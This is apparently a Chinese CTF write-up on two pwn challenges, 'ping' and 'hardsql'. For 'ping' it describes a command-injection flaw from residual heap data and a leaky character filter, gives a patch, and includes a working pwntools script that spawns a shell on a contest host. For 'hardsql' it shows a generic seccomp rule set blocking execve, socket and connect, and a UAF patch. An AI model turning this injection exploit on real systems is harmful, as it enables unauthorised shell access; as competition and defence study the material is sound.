# ping

这题最开始都没人做 EXP 出来，后期给了提示才做出了 EXP

## FIX

先讲我们的思路，先定位`main`函数，Line37 发现`system`调用

![](./img/3656588825547045840.png)

`command`由`new[]`创建，大小由`v16`确定。`v16`来源于`"ping"+v15`。命令经由`filterCommand`函数过滤

看到这里直接考虑命令注入漏洞

考虑到 EXP 可能会很长，这里直接考虑限制`new[]`的大小为 0x19，成功防御

* * *

其他师傅的思路为，在`filterCommand`函数中，修改过滤字符，使得`command`中的`/`被过滤掉

但事实上，并不是最好的防御方法，因为我们的 EXP 里不包含`/`字符（虽然他们防御成功了）

也就是说题目的 check 没有覆盖到位（bushi

![](./img/1435560646254536226.png)

## EXP

根据后来的提示，堆块没有清空，导致之前的数据仍残留其上，且`filterCommand`函数有问题。

循环中，若字符命中黑名单，则会`goto LABEL_7`。但是黑名单字符仍留于其上

![](./img/88613999566220726.png)

若按照如下构造：

    
    
    ---sh\0
    ----;-----
（其中`-`为 padding，空格为相对偏移）

经调试可知，第二次分配的地址位于第一次分配的地址的前`0x10`处

那么将通过分号导致命令注入夺取 shell

    
    
    from pwn import *
    from LibcSearcher import *
    
    context(os='linux', arch='amd64', log_level='debug',terminal=['tmux','splitw','-h'])
    
    sl=lambda x:io.sendline(x)
    sd=lambda x:io.send(x)
    sa=lambda x,y:io.sendafter(x,y)
    sla=lambda x,y:io.sendlineafter(x,y)
    rc=lambda x:io.recv(x)
    rl=lambda :io.recvline()
    ru=lambda x:io.recvuntil(x)
    ita=lambda :io.interactive()
    slc=lambda :asm(shellcraft.sh())
    uu64=lambda x:u64(x.ljust(8,b'\0'))
    uu32=lambda x:u32(x.ljust(4,b'\0'))
    def gdba(x=''):
        if type(io)==pwnlib.tubes.remote.remote:
            return
        elif type(io)==pwnlib.tubes.process.process:
            gdb.attach(io,x)
            pause()
    
    # io = process()
    # elf = ELF('./pwn')
    io = remote('172.16.9.41',9004)
    
    # sl(cyclic(0x400)+b'/bin/sh\0')
    sl(b'f'*0x3f0+b'sh\0kdaakeaakfaakfuckfuckfuckffff')
    sl(b'b'*(0x400-1)+b';')
    ita()
    

调试的部分当然是赛后进行的，在比赛过程我们是通过`cyclic` fuzz 出来的 hhh

所以很开心的拿下了一血

# hardsql

## FIX

这题其他师傅用的是通防（难怪嘎嘎上分），贴一下通防的脚本

    
    
    A = arch
    A != ARCH_X86_64 ? dead:next
    A = sys_number
    A < 0x40000000 ? try : next
    A != 0xffffffff ? dead : next
    try:
    A >= 0x609000 ? dead : next
    A == execve ? dead : next
    A == open ? dead : next
    A == openat ? dead : next
    A == open_by_handle_at ? dead : next
    A == socket ? dead : next
    A == connect ? dead : next
    A == bind ? dead : next
    A == listen ? dead : next
    A == clone ? dead : next
    return ALLOW
    dead:
    return KILL
    

本题我们是老老实实的 patch 的（被主办方的“会对通防检测”唬住了，现在才发现是此地无银三百两 hh）

题目存在 UAF（？，fuzz 过程中发现会泄露 heap address，故对之 patch

![](./img/4149801425622841867.png)

此处原本只令`ptr=0`，此处 jmp 走并对`*ptr=0`

![](./img/4949130992103205861.png)

至于 EXP，则没写出来 hhh

